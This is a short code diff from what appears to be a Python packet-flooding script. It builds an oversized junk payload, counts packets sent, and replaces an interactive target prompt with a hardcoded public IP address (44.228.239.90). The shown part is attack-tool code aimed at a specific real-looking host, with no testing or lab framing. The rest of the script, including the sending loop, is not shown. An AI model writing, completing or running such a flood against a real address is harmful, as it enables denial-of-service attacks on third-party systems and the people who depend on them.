@@ -11,7 +11,8 @@ import random
 payload = "GROUP1" * 3000;
 
 # Enter the IP Address of the target
-targetIP = input("Enter IP address of target: ");
+#targetIP = input("Enter IP address of target: ");
+targetIP = "44.228.239.90";
 
 # This counter is used to count the number of packets are sent.
 packetIP = 0;
